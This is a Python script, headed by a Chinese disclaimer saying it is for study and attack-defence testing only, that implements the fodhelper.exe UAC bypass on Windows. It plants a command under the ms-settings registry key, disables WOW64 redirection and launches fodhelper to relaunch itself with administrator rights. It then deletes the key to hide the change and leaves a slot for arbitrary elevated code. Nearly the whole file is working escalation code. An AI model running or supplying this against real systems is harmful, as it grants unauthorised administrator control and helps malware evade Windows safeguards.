#仅用于学习及攻防测试，请勿用于非法用途
import os
import sys
import ctypes
from ctypes import wintypes
import time

if sys.version_info[0] == 3:
    import winreg as winreg
else:
    import _winreg as winreg

CMD = r"C:\Windows\System32\cmd.exe"
FOD_HELPER = r"C:\Windows\System32\fodhelper.exe"
PYTHON_CMD = "python"
REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

# 禁用文件系统重定向的函数
def disable_fs_redirection():
    """禁用32位程序的Wow64文件系统重定向"""
    try:
        wow64_disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
        old_value = wintypes.LPVOID()
        if wow64_disable(ctypes.byref(old_value)):
            return old_value
        return None
    except:
        return None

def enable_fs_redirection(old_value):
    """恢复文件系统重定向"""
    try:
        wow64_revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
        return wow64_revert(old_value)
    except:
        return False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_reg_key(key, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise

def bypass_uac(cmd):
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        raise

def execute():
    if not is_admin():
        print('[!] The script is NOT running with administrative privileges')
        print('[+] Trying to bypass the UAC')
        try:
            current_dir = __file__
            cmd = '{} /k "{}" "{}"'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)
            
            # 禁用文件系统重定向
            old_redir = disable_fs_redirection()
            if old_redir is not None:
                print('[+] File system redirection disabled')
            
            print('[+] Launching fodhelper.exe from: {}'.format(FOD_HELPER))
            os.system(FOD_HELPER)
            
            # 恢复文件系统重定向
            if old_redir is not None:
                enable_fs_redirection(old_redir)
                print('[+] File system redirection restored')
            
            time.sleep(1)
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
                print('[+] Registry key cleaned up')
            except:
                pass
            
            sys.exit(0)
        except WindowsError as e:
            print('[!] Error: {}'.format(e))
            sys.exit(1)
    else:
        print('[+] The script is running with administrative privileges!')
        # 你的高权限代码在这里

if __name__ == '__main__':
    execute()